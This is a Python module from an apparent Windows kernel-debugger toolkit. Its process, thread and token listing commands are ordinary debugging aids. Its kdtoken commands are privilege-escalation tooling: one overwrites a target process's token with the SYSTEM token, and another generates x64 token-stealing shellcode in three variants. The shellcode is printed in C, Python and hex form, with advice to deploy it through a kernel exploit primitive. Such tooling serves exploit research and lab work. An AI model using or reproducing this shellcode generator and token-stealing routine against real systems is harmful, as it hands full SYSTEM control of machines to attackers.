"""Process / thread / token commands for kernel debug sessions.

Commands:
    kdps                       — list processes (walks ActiveProcessLinks)
    kdthreads <pid|name>       — list threads of a process
    kdtoken                    — list tokens of all processes
    kdtoken steal <src> <dst>  — copy a token from src process to dst process
    kdtoken shellcode <pid>    — emit asm that steals SYSTEM token at runtime
"""

import struct

from ..core.kd.ps_walker import (
    find_ps_initial_system_process, walk_processes, find_process,
    walk_threads, parse_eprocess,
)
from ..core.kd.win_structs import EPROCESS, ETHREAD, KTHREAD, KTRAP_FRAME, TOKEN_REF_MASK
from ..core.kd.offset_extractor import (
    extract_offsets, apply_offsets_to_classes, discover_thread_list_entry_offset,
)
from ..core.kd.token_shellcode import (
    build_minimal as _sc_build_minimal,
    build_irp as _sc_build_irp,
    build_sysret as _sc_build_sysret,
    format_c_array as _sc_format_c,
    format_python_bytes as _sc_format_py,
    format_hex_string as _sc_format_hex,
)
from ..display.formatters import (
    info, error, success, warn, console, banner,
)

from rich.text import Text
from rich.table import Table


# Cache: avoid re-resolving PsInitialSystemProcess on every call
_cached_system_eprocess = 0


def _get_session_and_system():
    """Helper: returns (session, system_eprocess) or (None, 0) on failure.

    Resolves PsInitialSystemProcess via the kernel base + export search.
    """
    global _cached_system_eprocess
    from .kd_cmds import _get_session, _find_kernel_base, _find_export

    session = _get_session()
    if session is None:
        return None, 0
    if not session.stopped:
        error("Target is running. Break first.")
        return None, 0

    if _cached_system_eprocess:
        return session, _cached_system_eprocess

    kbase = _find_kernel_base(session)
    if not kbase:
        error("Cannot locate kernel base — try running `lm` first")
        return None, 0

    # Extract struct offsets dynamically by disassembling stable ntoskrnl
    # exports (PsGetProcessId, PsGetProcessImageFileName, PsGetCurrentThreadId).
    # This avoids hardcoding per-Windows-build offset tables.
    extracted = extract_offsets(session, kbase, _find_export)
    apply_offsets_to_classes(extracted)
    if "EPROCESS.UniqueProcessId" in extracted:
        info(f"EPROCESS offsets (dynamic): "
             f"UniqueProcessId={EPROCESS.UniqueProcessId:#x}, "
             f"Token={EPROCESS.Token:#x}, "
             f"ImageFileName={EPROCESS.ImageFileName:#x}, "
             f"ThreadListHead={EPROCESS.ThreadListHead:#x}")
    else:
        warn("Failed to extract EPROCESS offsets via disasm — falling back to defaults")

    sys_eproc = find_ps_initial_system_process(session, kbase, _find_export)
    if not sys_eproc:
        error("Cannot resolve PsInitialSystemProcess")
        return None, 0

    # Phase 2: discover ETHREAD.ThreadListEntry by walking the System
    # process's ThreadListHead. No stable export reveals this offset, so
    # we infer it heuristically against the live System process.
    tle = discover_thread_list_entry_offset(session, sys_eproc)
    if tle is not None:
        ETHREAD.ThreadListEntry = tle
        info(f"ETHREAD offsets (dynamic): Cid={ETHREAD.Cid:#x}, ThreadListEntry={tle:#x}")
    else:
        warn("Failed to discover ETHREAD.ThreadListEntry — kdthreads may not work")

    _cached_system_eprocess = sys_eproc
    return session, sys_eproc


def invalidate_ps_cache():
    """Called by kddisconnect to clear the cache."""
    global _cached_system_eprocess
    _cached_system_eprocess = 0


# ---------------------------------------------------------------------------
# kdps — list processes
# ---------------------------------------------------------------------------

def cmd_kdps(debugger, args):
    """List running processes by walking ActiveProcessLinks.

    Usage: kdps [filter]
        filter — case-insensitive substring of process name
    """
    session, sys_eproc = _get_session_and_system()
    if session is None:
        return None

    filter_str = args.strip().lower()

    procs = list(walk_processes(session, sys_eproc))
    if not procs:
        warn("No processes found")
        return None

    if filter_str:
        procs = [p for p in procs if filter_str in p["name"].lower()]
        if not procs:
            warn(f"No process matching '{filter_str}'")
            return None

    banner(f"PROCESSES ({len(procs)})")

    tbl = Table(show_header=True, border_style="cyan", header_style="bold bright_white")
    tbl.add_column("PID", style="bright_yellow", justify="right")
    tbl.add_column("PPID", style="yellow", justify="right")
    tbl.add_column("Name", style="bold bright_green")
    tbl.add_column("EPROCESS", style="bright_cyan")
    tbl.add_column("Token", style="bright_magenta")
    tbl.add_column("DTB (CR3)", style="bright_black")

    for p in procs:
        tbl.add_row(
            str(p["pid"]),
            str(p["ppid"]),
            p["name"],
            f"{p['eproc']:#x}",
            f"{p['token']:#x}",
            f"{p['dtb']:#x}",
        )
    console.print(tbl)
    return None


# ---------------------------------------------------------------------------
# kdthreads — list threads of a process
# ---------------------------------------------------------------------------

def cmd_kdthreads(debugger, args):
    """List threads of a process.

    Usage: kdthreads <pid|name>
    """
    session, sys_eproc = _get_session_and_system()
    if session is None:
        return None

    arg = args.strip()
    if not arg:
        error("Usage: kdthreads <pid|name>")
        return None

    proc = None
    try:
        pid = int(arg, 0)
        proc = find_process(session, sys_eproc, pid=pid)
    except ValueError:
        proc = find_process(session, sys_eproc, name=arg)

    if proc is None:
        error(f"Process not found: {arg}")
        return None

    threads = list(walk_threads(session, proc["eproc"]))
    banner(f"THREADS of {proc['name']} (PID {proc['pid']})  —  {len(threads)} threads")

    tbl = Table(show_header=True, border_style="cyan", header_style="bold bright_white")
    tbl.add_column("TID", style="bright_yellow", justify="right")
    tbl.add_column("ETHREAD", style="bright_cyan")
    tbl.add_column("PID owner", style="bright_black", justify="right")

    for t in threads:
        tbl.add_row(
            str(t["tid"]),
            f"{t['ethread']:#x}",
            str(t["pid_owner"]),
        )
    console.print(tbl)
    return None


# ---------------------------------------------------------------------------
# kdtoken — token list / steal / shellcode
# ---------------------------------------------------------------------------

def cmd_kdtoken(debugger, args):
    """Token operations.

    Usage:
        kdtoken                                  — list all process tokens
        kdtoken steal <src> <dst>                — copy token from src to dst
                                                   (src/dst = pid or name; SYSTEM = pid 4)
        kdtoken shellcode [minimal|irp|sysret] [opts] — generate x64 shellcode with
                                                       live (dynamic) struct offsets.
                                                       Options:
                                                         --ret-offset <hex> (irp variant)
    """
    session, sys_eproc = _get_session_and_system()
    if session is None:
        return None

    parts = args.strip().split()

    if not parts:
        return _kdtoken_list(session, sys_eproc)

    sub = parts[0].lower()
    if sub == "steal":
        if len(parts) < 3:
            error("Usage: kdtoken steal <src_pid|name> <dst_pid|name>")
            return None
        return _kdtoken_steal(session, sys_eproc, parts[1], parts[2])
    if sub == "shellcode":
        return _kdtoken_shellcode(parts[1:])

    error(f"Unknown subcommand: {sub}  (list / steal / shellcode)")
    return None


def _kdtoken_list(session, sys_eproc):
    procs = list(walk_processes(session, sys_eproc))
    banner(f"PROCESS TOKENS ({len(procs)})")

    tbl = Table(show_header=True, border_style="cyan", header_style="bold bright_white")
    tbl.add_column("PID", style="bright_yellow", justify="right")
    tbl.add_column("Name", style="bold bright_green")
    tbl.add_column("Token (raw EX_FAST_REF)", style="bright_magenta")
    tbl.add_column("Token addr", style="bright_cyan")
    tbl.add_column("RefCnt", style="bright_black", justify="right")

    for p in procs:
        ref_cnt = p["token_ref"] & 0xF
        marker = " (SYSTEM)" if p["pid"] == 4 else ""
        tbl.add_row(
            str(p["pid"]),
            p["name"] + marker,
            f"{p['token_ref']:#x}",
            f"{p['token']:#x}",
            str(ref_cnt),
        )
    console.print(tbl)
    info("Hint: kdtoken steal 4 <target_pid>  to copy SYSTEM token to a target")
    return None


def _resolve_proc(session, sys_eproc, ident):
    """Accept a PID (decimal/hex) or a name substring."""
    try:
        return find_process(session, sys_eproc, pid=int(ident, 0))
    except ValueError:
        return find_process(session, sys_eproc, name=ident)


def _kdtoken_steal(session, sys_eproc, src_id, dst_id):
    src = _resolve_proc(session, sys_eproc, src_id)
    if src is None:
        error(f"Source process not found: {src_id}")
        return None
    dst = _resolve_proc(session, sys_eproc, dst_id)
    if dst is None:
        error(f"Destination process not found: {dst_id}")
        return None

    info(f"Source: {src['name']} (PID {src['pid']})  EPROCESS={src['eproc']:#x}  Token={src['token_ref']:#x}")
    info(f"Dest:   {dst['name']} (PID {dst['pid']})  EPROCESS={dst['eproc']:#x}  Token={dst['token_ref']:#x}")

    # Re-read to be safe
    fresh = parse_eprocess(session, src["eproc"])
    if fresh is None:
        error("Failed to re-read source EPROCESS")
        return None
    new_token_ref = fresh["token_ref"]

    target_addr = dst["eproc"] + EPROCESS.Token
    payload = struct.pack("<Q", new_token_ref)

    warn("Writing token... this kernel-patches the destination process — irreversible.")
    if not session.write_virtual(target_addr, payload):
        error(f"Failed to write to {target_addr:#x}")
        return None

    success(
        f"Token copied! {dst['name']} (PID {dst['pid']}) now runs with "
        f"the token of {src['name']} (PID {src['pid']})."
    )
    info("Continue execution and the target process will have elevated privileges.")
    return None


def _kdtoken_shellcode(opts):
    """Generate a token-stealing shellcode with the live struct offsets.

    opts is a list of args after the `shellcode` subcommand:
        [variant] [--ret-offset HEX]
    where variant is `minimal` (default) or `irp`.
    """
    variant = "minimal"
    ret_offset = 0xa86
    i = 0
    while i < len(opts):
        a = opts[i].lower()
        if a in ("minimal", "irp", "sysret"):
            variant = a
        elif a in ("--ret-offset", "--ret"):
            i += 1
            if i >= len(opts):
                error("--ret-offset needs a value")
                return None
            try:
                ret_offset = int(opts[i], 0)
            except ValueError:
                error(f"Invalid --ret-offset: {opts[i]}")
                return None
        else:
            error(f"Unknown option: {opts[i]}  (variants: minimal | irp | sysret)")
            return None
        i += 1

    upi   = EPROCESS.UniqueProcessId
    apl   = EPROCESS.ActiveProcessLinks
    tok   = EPROCESS.Token
    kproc = KTHREAD.Process

    if not (upi and apl and tok and kproc):
        error("Struct offsets not extracted yet — run `kdps` once first.")
        return None

    if variant == "minimal":
        data, lines = _sc_build_minimal(
            kthread_process=kproc,
            active_process_links=apl,
            unique_process_id=upi,
            token=tok,
        )
        title = "Token stealer — MINIMAL (standalone primitive)"
    elif variant == "irp":
        data, lines = _sc_build_irp(
            kthread_process=kproc,
            active_process_links=apl,
            unique_process_id=upi,
            token=tok,
            ret_offset=ret_offset,
        )
        title = f"Token stealer — IRP variant (ret_offset={ret_offset:#x})"
    else:  # sysret
        data, lines = _sc_build_sysret(
            kthread_process=kproc,
            active_process_links=apl,
            unique_process_id=upi,
            token=tok,
            kernel_apc_disable=KTHREAD.KernelApcDisable,
            ethread_trap_frame=ETHREAD.TrapFrame,
            trap_frame_rbp=KTRAP_FRAME.Rbp,
            trap_frame_rip=KTRAP_FRAME.Rip,
            trap_frame_eflags=KTRAP_FRAME.EFlags,
            trap_frame_rsp=KTRAP_FRAME.Rsp,
        )
        title = "Token stealer — SYSRET variant (userland return)"

    banner(title)
    info(
        f"Offsets used (live, dynamic):  "
        f"KTHREAD.Process={kproc:#x}  EPROCESS.UPI={upi:#x}  "
        f"ActiveProcessLinks={apl:#x}  Token={tok:#x}"
    )
    info(f"Length: {len(data)} bytes")

    # ----- Disassembly listing with hex bytes -----
    from rich.markup import escape
    console.print()
    console.print("[bold bright_cyan]Disassembly[/]")
    for off, length, asm, comment in lines:
        chunk = data[off:off + length]
        hex_col = " ".join(f"{b:02x}" for b in chunk)
        asm_padded = f"{asm:30s}"
        line = (
            f"  [bright_black]{off:04x}[/]  "
            f"[yellow]{hex_col:<26}[/]  "
            f"[bright_white]{escape(asm_padded)}[/]"
        )
        if comment:
            line += f"  [bright_black]; {escape(comment)}[/]"
        console.print(line)

    # ----- C array -----
    header_lines = [
        f"Token-stealing shellcode ({variant}) for the live target.",
        f"KTHREAD.Process={kproc:#x}  EPROCESS.UniqueProcessId={upi:#x}",
        f"EPROCESS.ActiveProcessLinks={apl:#x}  EPROCESS.Token={tok:#x}",
    ]
    c_src = _sc_format_c("shellcode", data, lines, header_lines)
    console.print()
    console.print("[bold bright_cyan]C array[/]")
    console.print(escape(c_src), style="bright_white")

    # ----- Python bytes -----
    console.print()
    console.print("[bold bright_cyan]Python[/]")
    console.print(escape(_sc_format_py(data)), style="bright_white")

    # ----- Hex string -----
    console.print()
    console.print("[bold bright_cyan]Hex[/]")
    console.print(_sc_format_hex(data), style="bright_white")

    console.print()
    info("Deploy via any kernel exec primitive (driver IRP hijack, "
         "writeable+executable kernel mapping, exploit gadget, etc.).")
    return None
